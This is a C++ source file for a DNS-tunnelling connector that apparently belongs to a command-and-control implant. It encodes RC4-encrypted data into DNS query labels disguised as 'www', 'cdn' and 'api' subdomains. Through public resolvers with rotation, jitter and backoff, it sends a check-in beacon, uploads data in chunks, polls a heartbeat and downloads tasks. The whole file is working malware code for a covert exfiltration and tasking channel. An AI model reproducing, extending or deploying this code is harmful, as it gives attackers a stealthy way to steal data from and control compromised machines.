#include "ConnectorDNS.h"
#include "DnsUtils.h"
#include "Crypt.h"
#include "utils.h"
#include "ApiLoader.h"
#include "DnsCompression.h"

extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);

static void SelectResolver(const CHAR* raw, CHAR* out, size_t outSize)
{
	const CHAR* def = "1.1.1.1";
	if (!raw || !raw[0]) {
		_snprintf(out, outSize, "%s", def);
		return;
	}

	size_t i = 0;
	while (raw[i] && i + 1 < outSize) {
		CHAR c = raw[i];
		if (c == ',' || c == ';' || c == ' ' || c == '\t' || c == '\r' || c == '\n')
			break;
		out[i] = c;
		++i;
	}
	out[i] = '\0';
	if (i == 0) {
		_snprintf(out, outSize, "%s", def);
	}
}

static ULONG DnsBuildWireSeq(ULONG logicalSeq, ULONG signalBits)
{
	ULONG seqCounter = logicalSeq & 0x0FFF;
	ULONG sig = signalBits & 0x0F;
	return (sig << 12) | seqCounter;
}

static const ULONG kDnsSignalBitsDNS = 0x1;

#pragma pack(push, 1)
typedef struct _DNS_META_V1 {
	BYTE  version;
	BYTE  metaFlags;
	USHORT reserved;
	ULONG downAckOffset;
} DNS_META_V1, *PDNS_META_V1;
#pragma pack(pop)

static void MetaV1Init(DNS_META_V1* h)
{
	if (!h) return;
	h->version      = 1;
	h->metaFlags    = 0;
	h->reserved     = 0;
	h->downAckOffset = 0;
}

static BOOL DnsQuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
	*outSize = 0;
	if (!ApiWin || !ApiWin->WSAStartup || !ApiWin->socket || !ApiWin->sendto || !ApiWin->recvfrom || !ApiWin->closesocket)
		return FALSE;

	WSADATA wsaData;
	if (ApiWin->WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return FALSE;

	SOCKET s = ApiWin->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (s == INVALID_SOCKET) {
		ApiWin->WSACleanup();
		return FALSE;
	}

	const CHAR* resolver = (resolverIP && resolverIP[0]) ? resolverIP : "1.1.1.1";

	HOSTENT* he = ApiWin->gethostbyname(resolver);
	if (!he || !he->h_addr_list || !he->h_addr_list[0]) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}

	sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(53);
	memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

	BYTE query[4096];
	memset(query, 0, sizeof(query));
	USHORT id = (USHORT)(GetTickCount() & 0xFFFF);
	query[0] = (BYTE)(id >> 8);
	query[1] = (BYTE)(id & 0xFF);
	query[2] = 0x01;
	query[3] = 0x00;
	query[4] = 0x00;
	query[5] = 0x01;

	int offset = 12;
	int nameLen = DnsEncodeName(qname, query + offset, sizeof(query) - offset - 4);
	if (nameLen < 0) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}
	offset += nameLen;
	USHORT qtypeCode = 16;
	if (qtypeStr && qtypeStr[0]) {
		CHAR qt[8];
		memset(qt, 0, sizeof(qt));
		int qi = 0;
		while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
			CHAR c = qtypeStr[qi];
			if (c >= 'a' && c <= 'z')
				c = (CHAR)(c - 'a' + 'A');
			qt[qi++] = c;
		}
		qt[qi] = '\0';
		if (qt[0] == 'A' && qt[1] == '\0') {
			qtypeCode = 1;
		} else if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0') {
			qtypeCode = 28;
		}
	}
	query[offset++] = (BYTE)(qtypeCode >> 8);
	query[offset++] = (BYTE)(qtypeCode & 0xFF);
	query[offset++] = 0x00;
	query[offset++] = 0x01;

	BYTE resp[1024];
	memset(resp, 0, sizeof(resp));
	int recvLen = 0;
	
	int sent = ApiWin->sendto(s, (const char*)query, offset, 0, (sockaddr*)&addr, sizeof(addr));
	if (sent != offset) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}

	fd_set readfds;
	readfds.fd_count = 1;
	readfds.fd_array[0] = s;
	timeval timeout;
	timeout.tv_sec = 3;
	timeout.tv_usec = 0;

	int selResult = ApiWin->select(0, &readfds, NULL, NULL, &timeout);
	if (selResult == 0) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}
	if (selResult == SOCKET_ERROR) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}

	int addrLen = sizeof(addr);
	recvLen = ApiWin->recvfrom(s, (char*)resp, sizeof(resp), 0, (sockaddr*)&addr, &addrLen);
	if (recvLen > 0) {
	}

	ApiWin->closesocket(s);
	ApiWin->WSACleanup();
	if (recvLen <= 0) {
		return FALSE;
	}

	if (recvLen < 12) {
		return FALSE;
	}
	int qdcount = (resp[4] << 8) | resp[5];
	int ancount = (resp[6] << 8) | resp[7];
	int pos = 12;
	for (int qi = 0; qi < qdcount; ++qi) {
		while (pos < recvLen && resp[pos] != 0) {
			if ((resp[pos] & 0xC0) == 0xC0) {
				pos += 2;
				break;
			}
			pos += resp[pos] + 1;
		}
		pos++;
		pos += 4;
	}

	ULONG written = 0;
	for (int ai = 0; ai < ancount; ++ai) {
		if (pos + 12 > recvLen)
			return FALSE;
		if ((resp[pos] & 0xC0) == 0xC0)
			pos += 2;
		else {
			while (pos < recvLen && resp[pos] != 0) {
				pos += resp[pos] + 1;
			}
			pos++;
		}
		USHORT type = (resp[pos] << 8) | resp[pos + 1];
		pos += 2;
		pos += 2;
		pos += 4;
		USHORT rdlen = (resp[pos] << 8) | resp[pos + 1];
		pos += 2;
		if (pos + rdlen > recvLen)
			return FALSE;

		if (qtypeCode == 16 && type == 16 && rdlen > 0) {
			USHORT consumed = 0;
			ULONG txtWritten = 0;
			while (consumed < rdlen) {
				if (pos + consumed >= recvLen)
					break;
				BYTE txtLen = resp[pos + consumed];
				consumed++;
				if (consumed + txtLen > rdlen)
					break;
				if (txtLen > 0) {
					if (txtWritten + txtLen <= outBufSize) {
						memcpy(outBuf + txtWritten, resp + pos + consumed, txtLen);
						txtWritten += txtLen;
					} else {
						break;
					}
				}
				consumed += txtLen;
			}
			if (txtWritten > 0) {
				*outSize = txtWritten;
				return TRUE;
			}
		} else if (qtypeCode == 1 && type == 1 && rdlen >= 4) {
			if (written + 4 <= outBufSize) {
				memcpy(outBuf + written, resp + pos, 4);
				written += 4;
			}
		} else if (qtypeCode == 28 && type == 28 && rdlen >= 16) {
			if (written + 16 <= outBufSize) {
				memcpy(outBuf + written, resp + pos, 16);
				written += 16;
			}
		}
		pos += rdlen;
	}

	if (qtypeCode == 1 || qtypeCode == 28) {
		if (written > 0) {
			*outSize = written;
			return TRUE;
		}
	}

	return FALSE;
}

ConnectorDNS::ConnectorDNS()
{
}

BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize, ULONG sleepDelaySeconds)
{
    this->profile = profile;
    this->sleepDelaySeconds = sleepDelaySeconds;

    this->resolverCount = 0;
    ZeroMemory(this->rawResolvers, sizeof(this->rawResolvers));
    for (ULONG i = 0; i < 16; ++i) {
        this->resolverList[i] = NULL;
        this->resolverFailCount[i] = 0;
        this->resolverDisabledUntil[i] = 0;
    }

    if (profile.resolvers && profile.resolvers[0]) {
        lstrcpynA(this->rawResolvers, (CHAR*)profile.resolvers, sizeof(this->rawResolvers));
        CHAR* p = this->rawResolvers;
        while (*p && this->resolverCount < 16) {
            while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
            if (!*p) break;
            this->resolverList[this->resolverCount++] = p;
            while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
            if (*p) *p++ = '\0';
        }
    }

    if (this->resolverCount == 0) {
        lstrcpynA(this->rawResolvers, "1.1.1.1", sizeof(this->rawResolvers));
        this->resolverList[0] = this->rawResolvers;
        this->resolverCount = 1;
    }

    for (ULONG i = 0; i < this->resolverCount; ++i) {
    }

    if (!profile.encrypt_key)
        return FALSE;
    memset(this->encryptKey, 0, sizeof(this->encryptKey));
    memcpy(this->encryptKey, profile.encrypt_key, 16);

    this->pktSize = profile.pkt_size ? profile.pkt_size : 1024;
    if (this->pktSize > 64000)
        this->pktSize = 64000;

    this->labelSize = profile.label_size ? profile.label_size : 48;
    if (this->labelSize == 0 || this->labelSize > 63)
        this->labelSize = 48;

    if (profile.domain)
        lstrcpynA(this->domain, (CHAR*)profile.domain, sizeof(this->domain));
    else
        this->domain[0] = 0;

    lstrcpynA(this->qtype, (CHAR*)"TXT", sizeof(this->qtype));

    if (!beat || !beatSize || beatSize < 8)
        return FALSE;

    BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
    if (!beatCopy)
        return FALSE;
    memcpy(beatCopy, beat, beatSize);

    EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);

    ULONG agentId = 0;
    if (beatSize >= 8) {
        agentId |= ((ULONG)beatCopy[4] << 24);
        agentId |= ((ULONG)beatCopy[5] << 16);
        agentId |= ((ULONG)beatCopy[6] << 8);
        agentId |= ((ULONG)beatCopy[7] << 0);
    }
    MemFreeLocal((LPVOID*)&beatCopy, beatSize);

    _snprintf(this->sid, sizeof(this->sid), "%08x", agentId);

    if (beat && beatSize) {
        this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
        if (this->hiBeat) {
            memcpy(this->hiBeat, beat, beatSize);
            this->hiBeatSize = beatSize;
            this->hiRetries  = 3;
            this->hiSent     = FALSE;
        }
    }

    this->initialized = TRUE;
    return TRUE;
}

void ConnectorDNS::CloseConnector()
{
    if (this->recvData) {
		MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
		this->recvData = NULL;
		this->recvSize = 0;
    }
    if (this->hiBeat && this->hiBeatSize) {
        MemFreeLocal((LPVOID*)&this->hiBeat, this->hiBeatSize);
        this->hiBeat = NULL;
        this->hiBeatSize = 0;
    }
    if (this->downBuf && this->downTotal) {
        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
        this->downBuf    = NULL;
        this->downTotal  = 0;
        this->downFilled = 0;
    }
}

void ConnectorDNS::UpdateResolvers(BYTE* resolvers)
{
	this->profile.resolvers = resolvers;

	this->resolverCount = 0;
	ZeroMemory(this->rawResolvers, sizeof(this->rawResolvers));
	for (ULONG i = 0; i < 16; ++i) {
		this->resolverList[i] = NULL;
		this->resolverFailCount[i] = 0;
		this->resolverDisabledUntil[i] = 0;
	}

	if (resolvers && resolvers[0]) {
		lstrcpynA(this->rawResolvers, (CHAR*)resolvers, sizeof(this->rawResolvers));
		CHAR* p = this->rawResolvers;
		while (*p && this->resolverCount < 16) {
			while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
			if (!*p) break;
			this->resolverList[this->resolverCount++] = p;
			while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
			if (*p) *p++ = '\0';
		}
	}

	if (this->resolverCount == 0) {
		lstrcpynA(this->rawResolvers, "1.1.1.1", sizeof(this->rawResolvers));
		this->resolverList[0] = this->rawResolvers;
		this->resolverCount = 1;
	}
}

BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
	*outSize = 0;

	if (this->resolverCount == 0) {
		return FALSE;
	}

	for (ULONG i = 0; i < this->resolverCount; ++i) {
		ULONG idx = (this->currentResolverIndex + i) % this->resolverCount;
		CHAR* resolver = this->resolverList[idx];
		if (!resolver || !*resolver) continue;

		ULONG nowTick = GetTickCount();
		if (this->resolverDisabledUntil[idx] && nowTick < this->resolverDisabledUntil[idx]) {
			continue;
		}

		if (DnsQuerySingle(qname, resolver, qtypeStr, outBuf, outBufSize, outSize)) {
			this->currentResolverIndex = idx;
			this->resolverFailCount[idx] = 0;
			this->resolverDisabledUntil[idx] = 0;
			return TRUE;
		}

		this->resolverFailCount[idx]++;

		const ULONG maxFail = 2;
		if (this->resolverFailCount[idx] >= maxFail) {
			ULONG backoff = 30000;
			if (this->sleepDelaySeconds > 0) {
				ULONG b = this->sleepDelaySeconds * 2000;
				if (b < 5000) b = 5000;
				if (b > 30000) b = 30000;
				backoff = b;
			}
			ULONG jitter = GetTickCount() & 0x0FFF;
			this->resolverDisabledUntil[idx] = GetTickCount() + backoff + jitter;
			this->resolverFailCount[idx] = 0;
		}
	}

	return FALSE;
}

void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
{
    ULONG pkt = this->pktSize ? this->pktSize : 1024;
    if (pkt > 64000)
        pkt = 64000;

    CHAR dataLabel[1024];
    memset(dataLabel, 0, sizeof(dataLabel));
    CHAR qname[512];
    memset(qname, 0, sizeof(qname));

    if (!this->hiSent && data && data_size) {
        const ULONG maxSafeFrame = 60;
        ULONG maxBuf = pkt;
        if (maxBuf > maxSafeFrame)
            maxBuf = maxSafeFrame;
        if (data_size && maxBuf > data_size)
            maxBuf = data_size;
        BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
        if (!encBuf)
            return;
        memcpy(encBuf, data, maxBuf);
        if (!DnsBuildDataLabels(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, maxBuf);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, maxBuf);

        ULONG hiWireSeq = DnsBuildWireSeq(this->seq, kDnsSignalBitsDNS);
        DnsBuildQName(this->sid, "www", hiWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
        BYTE tmp[512];
        ULONG tmpSize = 0;
        this->lastQueryOk = this->QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
        if (this->lastQueryOk) {
            this->hiSent = TRUE;
        } else {
            if (this->hiRetries > 0) {
                this->hiRetries--;
            }
        }
        return;
    }

    if (data && data_size) {
        this->lastQueryOk = TRUE;
        const ULONG metaSize = sizeof(DNS_META_V1);
        const ULONG headerSize = metaSize + 8;
        ULONG total = data_size;
        ULONG maxChunk = pkt;
        if (maxChunk <= headerSize)
            maxChunk = headerSize + 1;
        maxChunk -= headerSize;

        const ULONG maxSafeFrame = 60;
        if (maxChunk + headerSize > maxSafeFrame)
            maxChunk = maxSafeFrame - headerSize;

        const ULONG maxUploadSize = 4 << 20;
        if (total > maxUploadSize)
            total = maxUploadSize;

        ULONG seqForSend = ++this->seq;
        ULONG offset = 0;
        while (offset < total) {
            ULONG chunk = total - offset;
            if (chunk > maxChunk)
                chunk = maxChunk;

            ULONG frameSize = headerSize + chunk;
            BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
            if (!frame)
                return;

            DNS_META_V1 meta;
            MetaV1Init(&meta);
            if (this->downAckOffset > 0) {
                meta.metaFlags |= 0x01;
                meta.downAckOffset = this->downAckOffset;
            }
            memcpy(frame, &meta, metaSize);
            frame[metaSize + 0] = (BYTE)((total >> 24) & 0xFF);
            frame[metaSize + 1] = (BYTE)((total >> 16) & 0xFF);
            frame[metaSize + 2] = (BYTE)((total >> 8) & 0xFF);
            frame[metaSize + 3] = (BYTE)((total >> 0) & 0xFF);
            frame[metaSize + 4] = (BYTE)((offset >> 24) & 0xFF);
            frame[metaSize + 5] = (BYTE)((offset >> 16) & 0xFF);
            frame[metaSize + 6] = (BYTE)((offset >> 8) & 0xFF);
            frame[metaSize + 7] = (BYTE)((offset >> 0) & 0xFF);
            memcpy(frame + headerSize, data + offset, chunk);

            EncryptRC4(frame, frameSize, this->encryptKey, 16);

            memset(dataLabel, 0, sizeof(dataLabel));
            if (!DnsBuildDataLabels(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
                MemFreeLocal((LPVOID*)&frame, frameSize);
                return;
            }
            MemFreeLocal((LPVOID*)&frame, frameSize);

            ULONG putWireSeq = DnsBuildWireSeq(seqForSend, kDnsSignalBitsDNS);
            DnsBuildQName(this->sid, "cdn", putWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
            BYTE tmp[512];
            ULONG tmpSize = 0;
            
            BOOL putOk = FALSE;
            for (int retry = 0; retry < 3 && !putOk; retry++) {
                if (retry > 0) {
                    ApiWin->Sleep(100 + (GetTickCount() % 50));
                }
                putOk = this->QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
            }
            
            if (!putOk) {
                this->lastQueryOk = FALSE;
                return;
            }

            ULONG pacing = 30 + (GetTickCount() % 20);
            ApiWin->Sleep(pacing);

            offset += chunk;
        }
        this->lastUpTotal = total;
        this->lastQueryOk = TRUE;
        
        if (this->downAckOffset > 0) {
            ULONG ackNonce = GetTickCount() ^ (this->seq * 7919) ^ 0xACEACE;
            BYTE ackData[12];
            ackData[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
            ackData[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
            ackData[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
            ackData[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
            ackData[4] = (BYTE)((ackNonce >> 24) & 0xFF);
            ackData[5] = (BYTE)((ackNonce >> 16) & 0xFF);
            ackData[6] = (BYTE)((ackNonce >> 8) & 0xFF);
            ackData[7] = (BYTE)((ackNonce >> 0) & 0xFF);
            ackData[8] = (BYTE)((this->downTaskNonce >> 24) & 0xFF);
            ackData[9] = (BYTE)((this->downTaskNonce >> 16) & 0xFF);
            ackData[10] = (BYTE)((this->downTaskNonce >> 8) & 0xFF);
            ackData[11] = (BYTE)((this->downTaskNonce >> 0) & 0xFF);
            EncryptRC4(ackData, 12, this->encryptKey, 16);
            CHAR ackLabel[32];
            memset(ackLabel, 0, sizeof(ackLabel));
            DnsBase32Encode(ackData, 12, ackLabel, sizeof(ackLabel));
            
            CHAR ackQname[256];
            DnsBuildQName(this->sid, "hb", ++this->seq, this->idx, ackLabel, this->domain, ackQname, sizeof(ackQname));
            BYTE tmp[16];
            ULONG tmpSize = 0;
            this->QueryWithRotation(ackQname, "A", tmp, sizeof(tmp), &tmpSize);
        }
        return;
    }

    if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
        ULONG maxBuf = pkt;
        ULONG retrySize = this->hiBeatSize;
        if (retrySize > maxBuf)
            retrySize = maxBuf;
        BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
        if (!encBuf)
            return;
        memcpy(encBuf, this->hiBeat, retrySize);
        if (!DnsBuildDataLabels(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, retrySize);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, retrySize);

        ULONG hiRetryWireSeq = DnsBuildWireSeq(this->seq, kDnsSignalBitsDNS);
        DnsBuildQName(this->sid, "www", hiRetryWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
        BYTE tmp[512];
        ULONG tmpSize = 0;
        if (this->QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
            this->hiSent = TRUE;
            this->lastQueryOk = TRUE;
        } else {
            this->lastQueryOk = FALSE;
            if (this->hiRetries > 0)
                this->hiRetries--;
        }
        return;
    }

    if (!this->forcePoll && !this->downBuf && !this->hasPendingTasks && this->qtype[0] == 'T') {
        CHAR qnameA[512];
        ULONG hbNonce = GetTickCount() ^ (this->seq * 7919);
        BYTE hbData[12];
        hbData[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
        hbData[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
        hbData[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
        hbData[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
        hbData[4] = (BYTE)((hbNonce >> 24) & 0xFF);
        hbData[5] = (BYTE)((hbNonce >> 16) & 0xFF);
        hbData[6] = (BYTE)((hbNonce >> 8) & 0xFF);
        hbData[7] = (BYTE)((hbNonce >> 0) & 0xFF);
        hbData[8] = (BYTE)((this->downTaskNonce >> 24) & 0xFF);
        hbData[9] = (BYTE)((this->downTaskNonce >> 16) & 0xFF);
        hbData[10] = (BYTE)((this->downTaskNonce >> 8) & 0xFF);
        hbData[11] = (BYTE)((this->downTaskNonce >> 0) & 0xFF);
        EncryptRC4(hbData, 12, this->encryptKey, 16);
        CHAR hbLabel[32];
        memset(hbLabel, 0, sizeof(hbLabel));
        DnsBase32Encode(hbData, 12, hbLabel, sizeof(hbLabel));
        ULONG hbLogicalSeq = this->seq + 1;
        ULONG hbWireSeq = DnsBuildWireSeq(hbLogicalSeq, kDnsSignalBitsDNS);
        DnsBuildQName(this->sid, "hb", hbWireSeq, this->idx, hbLabel, this->domain, qnameA, sizeof(qnameA));
        
        BYTE ipBuf[16];
        ULONG ipSize = 0;
        if (this->QueryWithRotation(qnameA, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
            this->lastQueryOk = TRUE;
            if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
                this->seq++;
                this->downAckOffset = 0;
                this->hasPendingTasks = FALSE;
                return;
            }
            this->hasPendingTasks = TRUE;
            this->seq++;
            return;
        } else {
            this->lastQueryOk = FALSE;
            return;
        }
    }

    if (this->forcePoll) {
        this->forcePoll = FALSE;
    }

    ULONG reqOffset = this->downFilled;
    ULONG nonce = GetTickCount() ^ (this->seq << 16) ^ (reqOffset * 31337);
    
    BYTE reqData[8];
    reqData[0] = (BYTE)((reqOffset >> 24) & 0xFF);
    reqData[1] = (BYTE)((reqOffset >> 16) & 0xFF);
    reqData[2] = (BYTE)((reqOffset >> 8) & 0xFF);
    reqData[3] = (BYTE)((reqOffset >> 0) & 0xFF);
    reqData[4] = (BYTE)((nonce >> 24) & 0xFF);
    reqData[5] = (BYTE)((nonce >> 16) & 0xFF);
    reqData[6] = (BYTE)((nonce >> 8) & 0xFF);
    reqData[7] = (BYTE)((nonce >> 0) & 0xFF);
    EncryptRC4(reqData, 8, this->encryptKey, 16);
    CHAR reqLabel[24];
    memset(reqLabel, 0, sizeof(reqLabel));
    DnsBase32Encode(reqData, 8, reqLabel, sizeof(reqLabel));
    
    ULONG logicalSeq = ++this->seq;
    ULONG getWireSeq = DnsBuildWireSeq(logicalSeq, kDnsSignalBitsDNS);
    DnsBuildQName(this->sid, "api", getWireSeq, this->idx, reqLabel, this->domain, qname, sizeof(qname));
    BYTE respBuf[1024];
    ULONG respSize = 0;
    if (this->QueryWithRotation(qname, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
        this->lastQueryOk = TRUE;
        if (respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') {
            return;
        }

        BYTE binBuf[1024];
        int binLen = DnsBase64Decode((const CHAR*)respBuf, respSize, binBuf, sizeof(binBuf));
        if (binLen <= 0) {
            if (this->downBuf) {
                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                this->downBuf = NULL;
                this->downTotal = 0;
                this->downFilled = 0;
                this->downAckOffset = 0;
            }
            return;
        }

        DecryptRC4(binBuf, binLen, this->encryptKey, 16);

        const ULONG headerSize = 8;
        if (binLen > headerSize) {
            ULONG total = 0;
            ULONG offset = 0;
            total |= ((ULONG)binBuf[0] << 24);
            total |= ((ULONG)binBuf[1] << 16);
            total |= ((ULONG)binBuf[2] << 8);
            total |= ((ULONG)binBuf[3] << 0);
            offset |= ((ULONG)binBuf[4] << 24);
            offset |= ((ULONG)binBuf[5] << 16);
            offset |= ((ULONG)binBuf[6] << 8);
            offset |= ((ULONG)binBuf[7] << 0);
            ULONG chunkLen = binLen - headerSize;
            const ULONG maxDownloadSize = 4 << 20;
            
            if (total > maxDownloadSize) {
                if (this->downBuf) {
                    MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                    this->downBuf = NULL;
                }
                this->downTotal = 0;
                this->downFilled = 0;
                this->downAckOffset = 0;
                this->downTaskNonce = 0;
                this->hasPendingTasks = FALSE;
                return;
            }
            
            if (total > 0 && total <= maxDownloadSize && offset < total) {
                if (offset != reqOffset) {
                    if (offset == 0 && reqOffset > 0 && chunkLen >= 9) {
                        ULONG newTaskNonce = 0;
                        newTaskNonce |= (ULONG)binBuf[headerSize + 1];
                        newTaskNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
                        newTaskNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
                        newTaskNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
                        
                        if (newTaskNonce != 0 && newTaskNonce != this->downTaskNonce) {
                            if (this->downBuf) {
                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                            }
                            this->downBuf = NULL;
                            this->downTotal = 0;
                            this->downFilled = 0;
                            this->downAckOffset = 0;
                            this->downTaskNonce = 0;
                        } else {
                            return;
                        }
                    } else {
                        return;
                    }
                }
                
                ULONG chunkTaskNonce = 0;
                if (offset == 0 && chunkLen >= 9) {
                    chunkTaskNonce |= (ULONG)binBuf[headerSize + 1];
                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
                }
                
                BOOL isNewTask = (!this->downBuf || this->downTotal != total);
                if (!isNewTask && offset == 0 && chunkTaskNonce != 0 && chunkTaskNonce != this->downTaskNonce) {
                    isNewTask = TRUE;
                }
                
                if (isNewTask && offset == 0 && chunkTaskNonce != 0 && 
                    chunkTaskNonce == this->downTaskNonce && this->downAckOffset > 0) {
                    return;
                }
                
                if (isNewTask) {
                    if (this->downBuf && this->downTotal) {
                        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                    }
                    this->downBuf = (BYTE*)MemAllocLocal(total);
                    if (!this->downBuf) {
                        this->downTotal  = 0;
                        this->downFilled = 0;
                        return;
                    }
                    this->downTotal  = total;
                    this->downFilled = 0;
                    this->downAckOffset = 0;
                    this->downTaskNonce = chunkTaskNonce;
                    
                    if (offset != 0) {
                        return;
                    }
                }

                ULONG end = offset + chunkLen;
                if (end > total)
                    end = total;
                ULONG n = end - offset;
                memcpy(this->downBuf + offset, binBuf + headerSize, n);
                
                this->downFilled = offset + n;
                this->downAckOffset = this->downFilled;
                if (this->downFilled >= this->downTotal) {
                    const ULONG frameHeaderSize = 9;
                    BYTE* finalBuf   = this->downBuf;
                    ULONG finalSize  = this->downTotal;
                    if (this->downTotal > frameHeaderSize) {
                        BYTE  flags = this->downBuf[0];
                        ULONG orig  = 0;
                        orig |= (ULONG)this->downBuf[5];
                        orig |= ((ULONG)this->downBuf[6] << 8);
                        orig |= ((ULONG)this->downBuf[7] << 16);
                        orig |= ((ULONG)this->downBuf[8] << 24);

                        if ((flags & 0x1) && orig > 0 && orig <= (4u << 20)) {
                            BYTE* outBuf = NULL;
                            if (DeflateDecompress(this->downBuf + frameHeaderSize, this->downTotal - frameHeaderSize, &outBuf, orig) && outBuf) {
                                finalBuf  = outBuf;
                                finalSize = orig;
                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                                this->downBuf = NULL;
                            }
                        } else if (flags == 0 && orig > 0 && orig <= this->downTotal - frameHeaderSize) {
                            BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
                            if (outBuf) {
                                memcpy(outBuf, this->downBuf + frameHeaderSize, orig);
                                finalBuf  = outBuf;
                                finalSize = orig;
                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                                this->downBuf = NULL;
                            }
                        }
                    }

                    this->recvData = finalBuf;
                    this->recvSize = (int)finalSize;
                    this->lastDownTotal = finalSize;
                    this->downAckOffset = this->downTotal;
                    this->downBuf    = NULL;
                    this->downTotal  = 0;
                    this->downFilled = 0;
                    this->hasPendingTasks = FALSE;
                }
                return;
            }
        }
        if (binLen > headerSize) {
            if (this->downBuf) {
                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                this->downBuf = NULL;
            }
            this->downTotal = 0;
            this->downFilled = 0;
            this->downAckOffset = 0;
            this->downTaskNonce = 0;
            this->hasPendingTasks = FALSE;
            return;
        }
        this->recvData = (BYTE*)MemAllocLocal(binLen);
        if (!this->recvData)
            return;
        memcpy(this->recvData, binBuf, binLen);
        this->recvSize = (int)binLen;
    }
}

BYTE* ConnectorDNS::RecvData()
{
    return this->recvData;
}

int ConnectorDNS::RecvSize()
{
    return this->recvSize;
}

void ConnectorDNS::RecvClear()
{
	if (this->recvData) {
		MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
		this->recvData = NULL;
		this->recvSize = 0;
	}
}

BOOL ConnectorDNS::IsBusy() const
{
    return (this->downBuf != NULL) || this->hasPendingTasks;
}
